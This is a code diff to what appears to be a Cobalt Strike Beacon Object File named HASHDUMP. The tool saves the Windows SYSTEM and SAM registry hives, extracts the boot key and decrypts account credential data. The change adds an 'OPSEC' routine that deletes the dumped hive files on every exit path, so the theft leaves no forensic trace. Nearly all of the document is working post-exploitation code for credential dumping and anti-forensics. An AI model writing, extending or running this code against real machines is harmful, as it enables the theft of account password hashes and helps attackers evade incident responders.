@@ -249,6 +249,17 @@ void CleanupBackupPaths()
     FreeMemory(samBackupPath);
 }
 
+// OPSEC: the two temporary hive dumps must never survive the task. Call this
+// on every exit path after RegSaveKeyA succeeds. Idempotent (best-effort if a
+// still-mounted backup hive holds the file, deletion retried before unload).
+void DeleteHiveFiles()
+{
+    BOOL a = KERNEL32$DeleteFileA(systemBackupPath);
+    BOOL b = KERNEL32$DeleteFileA(samBackupPath);
+    if (a || b)
+        BeaconPrintf(CALLBACK_OUTPUT, "[HASHDUMP] Temporary hive dumps deleted");
+}
+
 void go()
 {
 
@@ -286,6 +297,8 @@ void go()
     ADVAPI32$RegCloseKey(hSystem);
     if (res != ERROR_SUCCESS && res != ERROR_ALREADY_EXISTS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegSaveKeyW failed: %d\n", res);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -293,6 +306,8 @@ void go()
     ADVAPI32$RegCloseKey(hSam);
     if (res != ERROR_SUCCESS && res != ERROR_ALREADY_EXISTS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegSaveKeyW failed: %d\n", res);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -302,6 +317,8 @@ void go()
     res = ADVAPI32$RegLoadKeyA(HKEY_LOCAL_MACHINE, tempSystemKey, systemBackupPath);
     if (res != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegLoadKeyA failed: %d\n", res);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -310,6 +327,9 @@ void go()
     res = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "BACKUP1", 0, KEY_READ, &hSystemBak);
     if (res != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open SYSTEM backup key: %d\n", res);
+        ADVAPI32$RegUnLoadKeyA(HKEY_LOCAL_MACHINE, tempSystemKey);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -323,6 +343,9 @@ void go()
     if (!GetBootKey(hSystemBak, lsaPath, bootKey)) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to extract boot key");
         ADVAPI32$RegCloseKey(hSystemBak);
+        ADVAPI32$RegUnLoadKeyA(HKEY_LOCAL_MACHINE, tempSystemKey);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
     ADVAPI32$RegCloseKey(hSystemBak);
@@ -336,6 +359,8 @@ void go()
     res = ADVAPI32$RegUnLoadKeyA(HKEY_LOCAL_MACHINE, tempSystemKey);
     if (res != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to unload SYSTEM backup key: %d\n", res);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -344,6 +369,8 @@ void go()
     if (!file)
     {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open SAM file");
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -352,6 +379,8 @@ void go()
     {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to read base block");
         MSVCRT$fclose(file);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -359,6 +388,8 @@ void go()
     {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Invalid registry file");
         MSVCRT$fclose(file);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -369,6 +400,8 @@ void go()
     {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to read root cell");
         MSVCRT$fclose(file);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -379,6 +412,8 @@ void go()
     {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Root key parse error");
         MSVCRT$fclose(file);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -393,6 +428,8 @@ void go()
     {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to navigate to account key");
         MSVCRT$fclose(file);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -404,6 +441,8 @@ void go()
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to parse value list");
         freeNkKey(&accountKey);
         MSVCRT$fclose(file);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -425,6 +464,8 @@ void go()
     {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to read F");
         MSVCRT$fclose(file);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -434,6 +475,8 @@ void go()
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] F too small");
         FreeMemory(fdata);
         MSVCRT$fclose(file);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -443,6 +486,8 @@ void go()
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] This version of Windows is currently unsupported");
         FreeMemory(fdata);
         MSVCRT$fclose(file);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -458,6 +503,8 @@ void go()
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to decrypt Bootkey");
         FreeMemory(fdata);
         MSVCRT$fclose(file);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -481,6 +528,8 @@ void go()
         FreeMemory(decryptedBootKey);
         freeNkKey(&usersKey);
         MSVCRT$fclose(file);
+        DeleteHiveFiles();
+        CleanupBackupPaths();
         return;
     }
 
@@ -702,5 +751,6 @@ void go()
 
 
     MSVCRT$fclose(file);
+    DeleteHiveFiles();
     CleanupBackupPaths();
 }
